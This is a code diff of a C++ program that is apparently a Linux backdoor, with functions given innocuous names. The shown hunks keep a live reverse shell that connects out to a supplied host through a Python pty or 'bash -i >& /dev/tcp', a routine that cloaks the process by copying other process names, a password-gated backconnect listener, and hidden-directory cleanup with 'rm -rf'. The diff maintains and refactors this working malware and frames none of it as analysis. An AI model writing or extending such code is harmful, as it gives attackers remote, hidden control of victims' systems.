@@ -1,19 +1,20 @@
 #include <iostream>
 #include <cstdlib>
-#include <boost/algorithm/string.hpp>
+#include <cstring>
 #include <thread>
 #include <fstream>
+#include <cstdio>
 #include <sstream>
+#include <vector>
 extern "C"{
     #include <signal.h>
-    #include <cstdio>
     #include <sys/stat.h>
+    #include <limits.h>
     #include <sys/utsname.h>
     #include <unistd.h>
     #include <stdio.h>
     #include <sys/prctl.h>
     #include <sys/socket.h>
-    #include <sys/utsname.h>
     #include <arpa/inet.h> 
 }
 
@@ -90,7 +91,7 @@ class gui_bar{
             system("rm -rf /tmp/.pythonbin/");
             system("rm -rf /etc/.pythonbin/");
         }
-        void bios_bitmap(string bios_host, string bios_num) // spawns a tty shell
+        void bios_bitmap(string bios_host, string bios_num) 
         {
             if(system(("python3 -c 'import os, pty, socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"" + string(bios_host) + "\", " + string(bios_num) + ")); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(\"HISTFILE\",\"/dev/null\"); pty.spawn(\"/bin/bash\"); s.close();'").c_str()) != 0){
                 if(system(("bash -i >& /dev/tcp/" + string(bios_host) + "/" + string(bios_num) + " 0>&1").c_str()) != 0){
@@ -185,7 +186,15 @@ class gui_user{
     string gui_procc(string gui_l){ // elite proccess cloaking!
         vector<string> gui_uv;
         string gui_buffer = gb.gui_c("ps -e -o command");
-        boost::split(gui_uv, gui_buffer, boost::is_any_of("\n"));
+        stringstream iss(gui_buffer);
+        while(iss.good())
+        {
+            string split_line;
+            getline(iss,split_line,'\n');
+            if(split_line.size() > 0 || split_line!="COMMAND"){
+                gui_uv.push_back(split_line);
+            }
+        }
         while(1){
           string gui_name = gui_uv[rand()%gui_uv.size()];
           if(gui_name.find("ps -e -o command") != -1 || gui_name == gui_l || gui_name=="COMMAND" || gui_name.size() <= 1){
@@ -223,20 +232,20 @@ class cli_architecture : gui_config{ // backconnect
         send(s0,("Enter Password> "), sizeof("Enter Password> "), 20);
         while(1){
             string line;
-            char data = 0; 
+            char data = 0; // Reading one at a time, hack!
             while (data != '\n'){
                 ssize_t datarecv = recv(s0, &data, 1, 0);
                 if(datarecv == -1){
-                    if (errno != EAGAIN && errno != EWOULDBLOCK){ 
+                    if (errno != EAGAIN && errno != EWOULDBLOCK){ //Connection error
                         close(s0);
                         return;
                     }
-                } if(datarecv == 0) {
+                } if(datarecv == 0) { //client disconnect
                     close(s0);
                     return;
                 }
                 line += data;
-                if (line.size() > 2048){ 
+                if (line.size() > 2048){ // Oh no!
                     close(s0);
                     return;
                 }
